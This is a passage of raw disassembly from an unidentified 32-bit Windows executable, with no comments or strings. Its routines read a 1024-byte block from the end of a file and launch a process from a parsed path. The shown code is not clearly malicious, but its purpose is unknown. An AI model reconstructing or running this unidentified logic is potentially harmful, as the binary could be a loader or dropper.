  404a3c:	6a 03                	push   $0x3
  404a3e:	6a 00                	push   $0x0
  404a40:	6a 01                	push   $0x1
  404a42:	8d 54 24 20          	lea    0x20(%esp),%edx
  404a46:	68 00 00 00 80       	push   $0x80000000
  404a4b:	52                   	push   %edx
  404a4c:	ff 15 40 b1 40 00    	call   *0x40b140
  404a52:	8b f0                	mov    %eax,%esi
  404a54:	83 fe ff             	cmp    $0xffffffff,%esi
  404a57:	75 0b                	jne    0x404a64
  404a59:	5f                   	pop    %edi
  404a5a:	33 c0                	xor    %eax,%eax
  404a5c:	5e                   	pop    %esi
  404a5d:	81 c4 08 01 00 00    	add    $0x108,%esp
  404a63:	c3                   	ret
  404a64:	6a 02                	push   $0x2
  404a66:	6a 00                	push   $0x0
  404a68:	68 00 fc ff ff       	push   $0xfffffc00
  404a6d:	56                   	push   %esi
  404a6e:	ff 15 48 b1 40 00    	call   *0x40b148
  404a74:	68 00 04 00 00       	push   $0x400
  404a79:	e8 62 5c 00 00       	call   0x40a6e0
  404a7e:	83 c4 04             	add    $0x4,%esp
  404a81:	8b f8                	mov    %eax,%edi
  404a83:	8d 44 24 08          	lea    0x8(%esp),%eax
  404a87:	6a 00                	push   $0x0
  404a89:	50                   	push   %eax
  404a8a:	68 00 04 00 00       	push   $0x400
  404a8f:	57                   	push   %edi
  404a90:	56                   	push   %esi
  404a91:	ff 15 44 b1 40 00    	call   *0x40b144
  404a97:	56                   	push   %esi
  404a98:	ff 15 e4 b1 40 00    	call   *0x40b1e4
  404a9e:	8b 8c 24 18 01 00 00 	mov    0x118(%esp),%ecx
  404aa5:	6a 00                	push   $0x0
  404aa7:	68 00 04 00 00       	push   $0x400
  404aac:	51                   	push   %ecx
  404aad:	57                   	push   %edi
  404aae:	e8 fd fe ff ff       	call   0x4049b0
  404ab3:	83 c4 10             	add    $0x10,%esp
  404ab6:	83 f8 ff             	cmp    $0xffffffff,%eax
  404ab9:	75 14                	jne    0x404acf
  404abb:	57                   	push   %edi
  404abc:	e8 25 5c 00 00       	call   0x40a6e6
  404ac1:	83 c4 04             	add    $0x4,%esp
  404ac4:	33 c0                	xor    %eax,%eax
  404ac6:	5f                   	pop    %edi
  404ac7:	5e                   	pop    %esi
  404ac8:	81 c4 08 01 00 00    	add    $0x108,%esp
  404ace:	c3                   	ret
  404acf:	03 c7                	add    %edi,%eax
  404ad1:	5f                   	pop    %edi
  404ad2:	5e                   	pop    %esi
  404ad3:	81 c4 08 01 00 00    	add    $0x108,%esp
  404ad9:	c3                   	ret
  404ada:	90                   	nop
  404adb:	90                   	nop
  404adc:	90                   	nop
  404add:	90                   	nop
  404ade:	90                   	nop
  404adf:	90                   	nop
  404ae0:	6a ff                	push   $0xffffffff
  404ae2:	68 46 ab 40 00       	push   $0x40ab46
  404ae7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404aed:	50                   	push   %eax
  404aee:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404af5:	81 ec e8 01 00 00    	sub    $0x1e8,%esp
  404afb:	8d 4c 24 00          	lea    0x0(%esp),%ecx
  404aff:	e8 4c d0 ff ff       	call   0x401b50
  404b04:	a1 10 e2 40 00       	mov    0x40e210,%eax
  404b09:	8d 4c 24 00          	lea    0x0(%esp),%ecx
  404b0d:	50                   	push   %eax
  404b0e:	68 30 e7 40 00       	push   $0x40e730
  404b13:	c7 84 24 f8 01 00 00 	movl   $0x0,0x1f8(%esp)
  404b1a:	00 00 00 00 
  404b1e:	e8 dd d1 ff ff       	call   0x401d00
  404b23:	84 c0                	test   %al,%al
  404b25:	75 2e                	jne    0x404b55
  404b27:	8d 4c 24 00          	lea    0x0(%esp),%ecx
  404b2b:	c7 84 24 f0 01 00 00 	movl   $0xffffffff,0x1f0(%esp)
  404b32:	ff ff ff ff 
  404b36:	e8 05 d1 ff ff       	call   0x401c40
  404b3b:	83 c8 ff             	or     $0xffffffff,%eax
  404b3e:	8b 8c 24 e8 01 00 00 	mov    0x1e8(%esp),%ecx
  404b45:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404b4c:	81 c4 f4 01 00 00    	add    $0x1f4,%esp
  404b52:	c2 04 00             	ret    $0x4
  404b55:	8d 4c 24 00          	lea    0x0(%esp),%ecx
  404b59:	51                   	push   %ecx
  404b5a:	8d 8c 24 bc 00 00 00 	lea    0xbc(%esp),%ecx
  404b61:	e8 9a e6 ff ff       	call   0x403200
  404b66:	8d 4c 24 00          	lea    0x0(%esp),%ecx
  404b6a:	c6 84 24 f0 01 00 00 	movb   $0x1,0x1f0(%esp)
  404b71:	01 
  404b72:	e8 a9 d3 ff ff       	call   0x401f20
  404b77:	8d 8c 24 b8 00 00 00 	lea    0xb8(%esp),%ecx
  404b7e:	c6 84 24 f0 01 00 00 	movb   $0x0,0x1f0(%esp)
  404b85:	00 
  404b86:	e8 15 e7 ff ff       	call   0x4032a0
  404b8b:	8d 4c 24 00          	lea    0x0(%esp),%ecx
  404b8f:	c7 84 24 f0 01 00 00 	movl   $0xffffffff,0x1f0(%esp)
  404b96:	ff ff ff ff 
  404b9a:	e8 a1 d0 ff ff       	call   0x401c40
  404b9f:	8b 8c 24 e8 01 00 00 	mov    0x1e8(%esp),%ecx
  404ba6:	33 c0                	xor    %eax,%eax
  404ba8:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404baf:	81 c4 f4 01 00 00    	add    $0x1f4,%esp
  404bb5:	c2 04 00             	ret    $0x4
  404bb8:	90                   	nop
  404bb9:	90                   	nop
  404bba:	90                   	nop
  404bbb:	90                   	nop
  404bbc:	90                   	nop
  404bbd:	90                   	nop
  404bbe:	90                   	nop
  404bbf:	90                   	nop
  404bc0:	6a ff                	push   $0xffffffff
  404bc2:	68 66 ab 40 00       	push   $0x40ab66
  404bc7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404bcd:	50                   	push   %eax
  404bce:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404bd5:	81 ec e8 00 00 00    	sub    $0xe8,%esp
  404bdb:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  404bdf:	e8 6c cf ff ff       	call   0x401b50
  404be4:	a1 10 e2 40 00       	mov    0x40e210,%eax
  404be9:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  404bed:	50                   	push   %eax
  404bee:	68 30 e7 40 00       	push   $0x40e730
  404bf3:	c7 84 24 f8 00 00 00 	movl   $0x0,0xf8(%esp)
  404bfa:	00 00 00 00 
  404bfe:	e8 fd d0 ff ff       	call   0x401d00
  404c03:	84 c0                	test   %al,%al
  404c05:	75 2e                	jne    0x404c35
  404c07:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  404c0b:	c7 84 24 f0 00 00 00 	movl   $0xffffffff,0xf0(%esp)
  404c12:	ff ff ff ff 
  404c16:	e8 25 d0 ff ff       	call   0x401c40
  404c1b:	83 c8 ff             	or     $0xffffffff,%eax
  404c1e:	8b 8c 24 e8 00 00 00 	mov    0xe8(%esp),%ecx
  404c25:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404c2c:	81 c4 f4 00 00 00    	add    $0xf4,%esp
  404c32:	c2 04 00             	ret    $0x4
  404c35:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  404c39:	51                   	push   %ecx
  404c3a:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  404c3e:	e8 4d 31 00 00       	call   0x407d90
  404c43:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  404c47:	c6 84 24 f0 00 00 00 	movb   $0x1,0xf0(%esp)
  404c4e:	01 
  404c4f:	e8 cc d2 ff ff       	call   0x401f20
  404c54:	8d 4c 24 00          	lea    0x0(%esp),%ecx
  404c58:	c6 84 24 f0 00 00 00 	movb   $0x0,0xf0(%esp)
  404c5f:	00 
  404c60:	e8 ab 33 00 00       	call   0x408010
  404c65:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  404c69:	c7 84 24 f0 00 00 00 	movl   $0xffffffff,0xf0(%esp)
  404c70:	ff ff ff ff 
  404c74:	e8 c7 cf ff ff       	call   0x401c40
  404c79:	8b 8c 24 e8 00 00 00 	mov    0xe8(%esp),%ecx
  404c80:	33 c0                	xor    %eax,%eax
  404c82:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404c89:	81 c4 f4 00 00 00    	add    $0xf4,%esp
  404c8f:	c2 04 00             	ret    $0x4
  404c92:	90                   	nop
  404c93:	90                   	nop
  404c94:	90                   	nop
  404c95:	90                   	nop
  404c96:	90                   	nop
  404c97:	90                   	nop
  404c98:	90                   	nop
  404c99:	90                   	nop
  404c9a:	90                   	nop
  404c9b:	90                   	nop
  404c9c:	90                   	nop
  404c9d:	90                   	nop
  404c9e:	90                   	nop
  404c9f:	90                   	nop
  404ca0:	6a ff                	push   $0xffffffff
  404ca2:	68 86 ab 40 00       	push   $0x40ab86
  404ca7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404cad:	50                   	push   %eax
  404cae:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404cb5:	81 ec 64 01 00 00    	sub    $0x164,%esp
  404cbb:	8d 4c 24 00          	lea    0x0(%esp),%ecx
  404cbf:	e8 8c ce ff ff       	call   0x401b50
  404cc4:	a1 10 e2 40 00       	mov    0x40e210,%eax
  404cc9:	8d 4c 24 00          	lea    0x0(%esp),%ecx
  404ccd:	50                   	push   %eax
  404cce:	68 30 e7 40 00       	push   $0x40e730
  404cd3:	c7 84 24 74 01 00 00 	movl   $0x0,0x174(%esp)
  404cda:	00 00 00 00 
  404cde:	e8 1d d0 ff ff       	call   0x401d00
  404ce3:	84 c0                	test   %al,%al
  404ce5:	75 2e                	jne    0x404d15
  404ce7:	8d 4c 24 00          	lea    0x0(%esp),%ecx
  404ceb:	c7 84 24 6c 01 00 00 	movl   $0xffffffff,0x16c(%esp)
  404cf2:	ff ff ff ff 
  404cf6:	e8 45 cf ff ff       	call   0x401c40
  404cfb:	83 c8 ff             	or     $0xffffffff,%eax
  404cfe:	8b 8c 24 64 01 00 00 	mov    0x164(%esp),%ecx
  404d05:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404d0c:	81 c4 70 01 00 00    	add    $0x170,%esp
  404d12:	c2 04 00             	ret    $0x4
  404d15:	8d 4c 24 00          	lea    0x0(%esp),%ecx
  404d19:	51                   	push   %ecx
  404d1a:	8d 8c 24 bc 00 00 00 	lea    0xbc(%esp),%ecx
  404d21:	e8 7a 19 00 00       	call   0x4066a0
  404d26:	8d 4c 24 00          	lea    0x0(%esp),%ecx
  404d2a:	c6 84 24 6c 01 00 00 	movb   $0x1,0x16c(%esp)
  404d31:	01 
  404d32:	e8 e9 d1 ff ff       	call   0x401f20
  404d37:	8d 8c 24 b8 00 00 00 	lea    0xb8(%esp),%ecx
  404d3e:	c6 84 24 6c 01 00 00 	movb   $0x0,0x16c(%esp)
  404d45:	00 
  404d46:	e8 75 1b 00 00       	call   0x4068c0
  404d4b:	8d 4c 24 00          	lea    0x0(%esp),%ecx
  404d4f:	c7 84 24 6c 01 00 00 	movl   $0xffffffff,0x16c(%esp)
  404d56:	ff ff ff ff 
  404d5a:	e8 e1 ce ff ff       	call   0x401c40
  404d5f:	8b 8c 24 64 01 00 00 	mov    0x164(%esp),%ecx
  404d66:	33 c0                	xor    %eax,%eax
  404d68:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404d6f:	81 c4 70 01 00 00    	add    $0x170,%esp
  404d75:	c2 04 00             	ret    $0x4
  404d78:	90                   	nop
  404d79:	90                   	nop
  404d7a:	90                   	nop
  404d7b:	90                   	nop
  404d7c:	90                   	nop
  404d7d:	90                   	nop
  404d7e:	90                   	nop
  404d7f:	90                   	nop
  404d80:	6a ff                	push   $0xffffffff
  404d82:	68 a6 ab 40 00       	push   $0x40aba6
  404d87:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404d8d:	50                   	push   %eax
  404d8e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404d95:	81 ec e8 00 00 00    	sub    $0xe8,%esp
  404d9b:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  404d9f:	e8 ac cd ff ff       	call   0x401b50
  404da4:	a1 10 e2 40 00       	mov    0x40e210,%eax
  404da9:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  404dad:	50                   	push   %eax
  404dae:	68 30 e7 40 00       	push   $0x40e730
  404db3:	c7 84 24 f8 00 00 00 	movl   $0x0,0xf8(%esp)
  404dba:	00 00 00 00 
  404dbe:	e8 3d cf ff ff       	call   0x401d00
  404dc3:	84 c0                	test   %al,%al
  404dc5:	75 2e                	jne    0x404df5
  404dc7:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  404dcb:	c7 84 24 f0 00 00 00 	movl   $0xffffffff,0xf0(%esp)
  404dd2:	ff ff ff ff 
  404dd6:	e8 65 ce ff ff       	call   0x401c40
  404ddb:	83 c8 ff             	or     $0xffffffff,%eax
  404dde:	8b 8c 24 e8 00 00 00 	mov    0xe8(%esp),%ecx
  404de5:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404dec:	81 c4 f4 00 00 00    	add    $0xf4,%esp
  404df2:	c2 04 00             	ret    $0x4
  404df5:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  404df9:	51                   	push   %ecx
  404dfa:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  404dfe:	e8 5d 52 00 00       	call   0x40a060
  404e03:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  404e07:	c6 84 24 f0 00 00 00 	movb   $0x1,0xf0(%esp)
  404e0e:	01 
  404e0f:	e8 0c d1 ff ff       	call   0x401f20
  404e14:	8d 4c 24 00          	lea    0x0(%esp),%ecx
  404e18:	c6 84 24 f0 00 00 00 	movb   $0x0,0xf0(%esp)
  404e1f:	00 
  404e20:	e8 db 52 00 00       	call   0x40a100
  404e25:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  404e29:	c7 84 24 f0 00 00 00 	movl   $0xffffffff,0xf0(%esp)
  404e30:	ff ff ff ff 
  404e34:	e8 07 ce ff ff       	call   0x401c40
  404e39:	8b 8c 24 e8 00 00 00 	mov    0xe8(%esp),%ecx
  404e40:	33 c0                	xor    %eax,%eax
  404e42:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404e49:	81 c4 f4 00 00 00    	add    $0xf4,%esp
  404e4f:	c2 04 00             	ret    $0x4
  404e52:	90                   	nop
  404e53:	90                   	nop
  404e54:	90                   	nop
  404e55:	90                   	nop
  404e56:	90                   	nop
  404e57:	90                   	nop
  404e58:	90                   	nop
  404e59:	90                   	nop
  404e5a:	90                   	nop
  404e5b:	90                   	nop
  404e5c:	90                   	nop
  404e5d:	90                   	nop
  404e5e:	90                   	nop
  404e5f:	90                   	nop
  404e60:	6a ff                	push   $0xffffffff
  404e62:	68 c6 ab 40 00       	push   $0x40abc6
  404e67:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404e6d:	50                   	push   %eax
  404e6e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404e75:	81 ec d0 00 00 00    	sub    $0xd0,%esp
  404e7b:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  404e7f:	e8 cc cc ff ff       	call   0x401b50
  404e84:	a1 10 e2 40 00       	mov    0x40e210,%eax
  404e89:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  404e8d:	50                   	push   %eax
  404e8e:	68 30 e7 40 00       	push   $0x40e730
  404e93:	c7 84 24 e0 00 00 00 	movl   $0x0,0xe0(%esp)
  404e9a:	00 00 00 00 
  404e9e:	e8 5d ce ff ff       	call   0x401d00
  404ea3:	84 c0                	test   %al,%al
  404ea5:	75 2e                	jne    0x404ed5
  404ea7:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  404eab:	c7 84 24 d8 00 00 00 	movl   $0xffffffff,0xd8(%esp)
  404eb2:	ff ff ff ff 
  404eb6:	e8 85 cd ff ff       	call   0x401c40
  404ebb:	83 c8 ff             	or     $0xffffffff,%eax
  404ebe:	8b 8c 24 d0 00 00 00 	mov    0xd0(%esp),%ecx
  404ec5:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404ecc:	81 c4 dc 00 00 00    	add    $0xdc,%esp
  404ed2:	c2 04 00             	ret    $0x4
  404ed5:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  404ed9:	51                   	push   %ecx
  404eda:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  404ede:	e8 0d c6 ff ff       	call   0x4014f0
  404ee3:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  404ee7:	c6 84 24 d8 00 00 00 	movb   $0x1,0xd8(%esp)
  404eee:	01 
  404eef:	e8 2c d0 ff ff       	call   0x401f20
  404ef4:	8d 4c 24 00          	lea    0x0(%esp),%ecx
  404ef8:	c6 84 24 d8 00 00 00 	movb   $0x0,0xd8(%esp)
  404eff:	00 
  404f00:	e8 9b c6 ff ff       	call   0x4015a0
  404f05:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  404f09:	c7 84 24 d8 00 00 00 	movl   $0xffffffff,0xd8(%esp)
  404f10:	ff ff ff ff 
  404f14:	e8 27 cd ff ff       	call   0x401c40
  404f19:	8b 8c 24 d0 00 00 00 	mov    0xd0(%esp),%ecx
  404f20:	33 c0                	xor    %eax,%eax
  404f22:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404f29:	81 c4 dc 00 00 00    	add    $0xdc,%esp
  404f2f:	c2 04 00             	ret    $0x4
  404f32:	90                   	nop
  404f33:	90                   	nop
  404f34:	90                   	nop
  404f35:	90                   	nop
  404f36:	90                   	nop
  404f37:	90                   	nop
  404f38:	90                   	nop
  404f39:	90                   	nop
  404f3a:	90                   	nop
  404f3b:	90                   	nop
  404f3c:	90                   	nop
  404f3d:	90                   	nop
  404f3e:	90                   	nop
  404f3f:	90                   	nop
  404f40:	6a ff                	push   $0xffffffff
  404f42:	68 e6 ab 40 00       	push   $0x40abe6
  404f47:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404f4d:	50                   	push   %eax
  404f4e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404f55:	81 ec c8 00 00 00    	sub    $0xc8,%esp
  404f5b:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  404f5f:	e8 ec cb ff ff       	call   0x401b50
  404f64:	a1 10 e2 40 00       	mov    0x40e210,%eax
  404f69:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  404f6d:	50                   	push   %eax
  404f6e:	68 30 e7 40 00       	push   $0x40e730
  404f73:	c7 84 24 d8 00 00 00 	movl   $0x0,0xd8(%esp)
  404f7a:	00 00 00 00 
  404f7e:	e8 7d cd ff ff       	call   0x401d00
  404f83:	84 c0                	test   %al,%al
  404f85:	75 2e                	jne    0x404fb5
  404f87:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  404f8b:	c7 84 24 d0 00 00 00 	movl   $0xffffffff,0xd0(%esp)
  404f92:	ff ff ff ff 
  404f96:	e8 a5 cc ff ff       	call   0x401c40
  404f9b:	83 c8 ff             	or     $0xffffffff,%eax
  404f9e:	8b 8c 24 c8 00 00 00 	mov    0xc8(%esp),%ecx
  404fa5:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404fac:	81 c4 d4 00 00 00    	add    $0xd4,%esp
  404fb2:	c2 04 00             	ret    $0x4
  404fb5:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  404fb9:	51                   	push   %ecx
  404fba:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  404fbe:	e8 5d 0c 00 00       	call   0x405c20
  404fc3:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  404fc7:	c6 84 24 d0 00 00 00 	movb   $0x1,0xd0(%esp)
  404fce:	01 
  404fcf:	e8 4c cf ff ff       	call   0x401f20
  404fd4:	8d 4c 24 00          	lea    0x0(%esp),%ecx
  404fd8:	c6 84 24 d0 00 00 00 	movb   $0x0,0xd0(%esp)
  404fdf:	00 
  404fe0:	e8 3b 0d 00 00       	call   0x405d20
  404fe5:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  404fe9:	c7 84 24 d0 00 00 00 	movl   $0xffffffff,0xd0(%esp)
  404ff0:	ff ff ff ff 
  404ff4:	e8 47 cc ff ff       	call   0x401c40
  404ff9:	8b 8c 24 c8 00 00 00 	mov    0xc8(%esp),%ecx
  405000:	33 c0                	xor    %eax,%eax
  405002:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  405009:	81 c4 d4 00 00 00    	add    $0xd4,%esp
  40500f:	c2 04 00             	ret    $0x4
  405012:	90                   	nop
  405013:	90                   	nop
  405014:	90                   	nop
  405015:	90                   	nop
  405016:	90                   	nop
  405017:	90                   	nop
  405018:	90                   	nop
  405019:	90                   	nop
  40501a:	90                   	nop
  40501b:	90                   	nop
  40501c:	90                   	nop
  40501d:	90                   	nop
  40501e:	90                   	nop
  40501f:	90                   	nop
  405020:	6a ff                	push   $0xffffffff
  405022:	68 06 ac 40 00       	push   $0x40ac06
  405027:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40502d:	50                   	push   %eax
  40502e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  405035:	81 ec c8 00 00 00    	sub    $0xc8,%esp
  40503b:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  40503f:	e8 0c cb ff ff       	call   0x401b50
  405044:	a1 10 e2 40 00       	mov    0x40e210,%eax
  405049:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  40504d:	50                   	push   %eax
  40504e:	68 30 e7 40 00       	push   $0x40e730
  405053:	c7 84 24 d8 00 00 00 	movl   $0x0,0xd8(%esp)
  40505a:	00 00 00 00 
  40505e:	e8 9d cc ff ff       	call   0x401d00
  405063:	84 c0                	test   %al,%al
  405065:	75 2e                	jne    0x405095
  405067:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  40506b:	c7 84 24 d0 00 00 00 	movl   $0xffffffff,0xd0(%esp)
  405072:	ff ff ff ff 
  405076:	e8 c5 cb ff ff       	call   0x401c40
  40507b:	83 c8 ff             	or     $0xffffffff,%eax
  40507e:	8b 8c 24 c8 00 00 00 	mov    0xc8(%esp),%ecx
  405085:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40508c:	81 c4 d4 00 00 00    	add    $0xd4,%esp
  405092:	c2 04 00             	ret    $0x4
  405095:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  405099:	51                   	push   %ecx
  40509a:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  40509e:	e8 8d 3d 00 00       	call   0x408e30
  4050a3:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  4050a7:	c6 84 24 d0 00 00 00 	movb   $0x1,0xd0(%esp)
  4050ae:	01 
  4050af:	e8 6c ce ff ff       	call   0x401f20
  4050b4:	8d 4c 24 00          	lea    0x0(%esp),%ecx
  4050b8:	c6 84 24 d0 00 00 00 	movb   $0x0,0xd0(%esp)
  4050bf:	00 
  4050c0:	e8 db 3d 00 00       	call   0x408ea0
  4050c5:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  4050c9:	c7 84 24 d0 00 00 00 	movl   $0xffffffff,0xd0(%esp)
  4050d0:	ff ff ff ff 
  4050d4:	e8 67 cb ff ff       	call   0x401c40
  4050d9:	8b 8c 24 c8 00 00 00 	mov    0xc8(%esp),%ecx
  4050e0:	33 c0                	xor    %eax,%eax
  4050e2:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4050e9:	81 c4 d4 00 00 00    	add    $0xd4,%esp
  4050ef:	c2 04 00             	ret    $0x4
  4050f2:	90                   	nop
  4050f3:	90                   	nop
  4050f4:	90                   	nop
  4050f5:	90                   	nop
  4050f6:	90                   	nop
  4050f7:	90                   	nop
  4050f8:	90                   	nop
  4050f9:	90                   	nop
  4050fa:	90                   	nop
  4050fb:	90                   	nop
  4050fc:	90                   	nop
  4050fd:	90                   	nop
  4050fe:	90                   	nop
  4050ff:	90                   	nop
  405100:	83 ec 54             	sub    $0x54,%esp
  405103:	83 c9 ff             	or     $0xffffffff,%ecx
  405106:	33 c0                	xor    %eax,%eax
  405108:	53                   	push   %ebx
  405109:	56                   	push   %esi
  40510a:	8b 74 24 60          	mov    0x60(%esp),%esi
  40510e:	57                   	push   %edi
  40510f:	8b fe                	mov    %esi,%edi
  405111:	f2 ae                	repnz scas %es:(%edi),%al
  405113:	f7 d1                	not    %ecx
  405115:	49                   	dec    %ecx
  405116:	75 09                	jne    0x405121
  405118:	5f                   	pop    %edi
  405119:	5e                   	pop    %esi
  40511a:	5b                   	pop    %ebx
  40511b:	83 c4 54             	add    $0x54,%esp
  40511e:	c2 04 00             	ret    $0x4
  405121:	8d 79 01             	lea    0x1(%ecx),%edi
  405124:	57                   	push   %edi
  405125:	ff 15 5c b2 40 00    	call   *0x40b25c
  40512b:	8b cf                	mov    %edi,%ecx
  40512d:	8b d8                	mov    %eax,%ebx
  40512f:	8b c1                	mov    %ecx,%eax
  405131:	8b fb                	mov    %ebx,%edi
  405133:	c1 e9 02             	shr    $0x2,%ecx
  405136:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  405138:	8b c8                	mov    %eax,%ecx
  40513a:	6a 2f                	push   $0x2f
  40513c:	83 e1 03             	and    $0x3,%ecx
  40513f:	53                   	push   %ebx
  405140:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  405142:	ff 15 68 b2 40 00    	call   *0x40b268
  405148:	8b f0                	mov    %eax,%esi
  40514a:	83 c4 0c             	add    $0xc,%esp
  40514d:	46                   	inc    %esi
  40514e:	75 0b                	jne    0x40515b
  405150:	5f                   	pop    %edi
  405151:	5e                   	pop    %esi
  405152:	33 c0                	xor    %eax,%eax
  405154:	5b                   	pop    %ebx
  405155:	83 c4 54             	add    $0x54,%esp
  405158:	c2 04 00             	ret    $0x4
  40515b:	56                   	push   %esi
  40515c:	53                   	push   %ebx
  40515d:	e8 4e 49 00 00       	call   0x409ab0
  405162:	83 c4 08             	add    $0x8,%esp
  405165:	84 c0                	test   %al,%al
  405167:	75 0b                	jne    0x405174
  405169:	5f                   	pop    %edi
  40516a:	5e                   	pop    %esi
  40516b:	33 c0                	xor    %eax,%eax
  40516d:	5b                   	pop    %ebx
  40516e:	83 c4 54             	add    $0x54,%esp
  405171:	c2 04 00             	ret    $0x4
  405174:	b9 10 00 00 00       	mov    $0x10,%ecx
  405179:	33 c0                	xor    %eax,%eax
  40517b:	8d 7c 24 20          	lea    0x20(%esp),%edi
  40517f:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  405183:	f3 ab                	rep stos %eax,%es:(%edi)
  405185:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  405189:	c7 44 24 1c 44 00 00 	movl   $0x44,0x1c(%esp)
  405190:	00 
  405191:	51                   	push   %ecx
  405192:	52                   	push   %edx
  405193:	50                   	push   %eax
  405194:	50                   	push   %eax
  405195:	50                   	push   %eax
  405196:	50                   	push   %eax
  405197:	50                   	push   %eax
  405198:	50                   	push   %eax
  405199:	56                   	push   %esi
  40519a:	50                   	push   %eax
  40519b:	c7 44 24 4c 6c e1 40 	movl   $0x40e16c,0x4c(%esp)
  4051a2:	00 
  4051a3:	ff 15 0c b1 40 00    	call   *0x40b10c
  4051a9:	5f                   	pop    %edi
  4051aa:	5e                   	pop    %esi
  4051ab:	b8 01 00 00 00       	mov    $0x1,%eax
  4051b0:	5b                   	pop    %ebx
  4051b1:	83 c4 54             	add    $0x54,%esp
  4051b4:	c2 04 00             	ret    $0x4
  4051b7:	90                   	nop
  4051b8:	90                   	nop
  4051b9:	90                   	nop
  4051ba:	90                   	nop
  4051bb:	90                   	nop
  4051bc:	90                   	nop
  4051bd:	90                   	nop
  4051be:	90                   	nop
  4051bf:	90                   	nop
  4051c0:	83 ec 54             	sub    $0x54,%esp
  4051c3:	56                   	push   %esi
  4051c4:	57                   	push   %edi
  4051c5:	8b 7c 24 60          	mov    0x60(%esp),%edi
  4051c9:	6a 2f                	push   $0x2f
  4051cb:	57                   	push   %edi
  4051cc:	ff 15 68 b2 40 00    	call   *0x40b268
  4051d2:	8b f0                	mov    %eax,%esi
  4051d4:	83 c4 08             	add    $0x8,%esp
  4051d7:	46                   	inc    %esi
  4051d8:	75 08                	jne    0x4051e2
  4051da:	5f                   	pop    %edi
  4051db:	32 c0                	xor    %al,%al
  4051dd:	5e                   	pop    %esi
  4051de:	83 c4 54             	add    $0x54,%esp
  4051e1:	c3                   	ret
  4051e2:	56                   	push   %esi
  4051e3:	57                   	push   %edi
  4051e4:	e8 c7 48 00 00       	call   0x409ab0
  4051e9:	83 c4 08             	add    $0x8,%esp
  4051ec:	84 c0                	test   %al,%al
  4051ee:	75 06                	jne    0x4051f6
  4051f0:	5f                   	pop    %edi
  4051f1:	5e                   	pop    %esi
  4051f2:	83 c4 54             	add    $0x54,%esp
  4051f5:	c3                   	ret
  4051f6:	b9 10 00 00 00       	mov    $0x10,%ecx
  4051fb:	33 c0                	xor    %eax,%eax
  4051fd:	8d 7c 24 1c          	lea    0x1c(%esp),%edi
  405201:	f3 ab                	rep stos %eax,%es:(%edi)
  405203:	8d 44 24 08          	lea    0x8(%esp),%eax
  405207:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  40520b:	50                   	push   %eax
  40520c:	51                   	push   %ecx
  40520d:	6a 00                	push   $0x0
  40520f:	6a 00                	push   $0x0
  405211:	6a 00                	push   $0x0
  405213:	6a 00                	push   $0x0
  405215:	6a 00                	push   $0x0
  405217:	6a 00                	push   $0x0
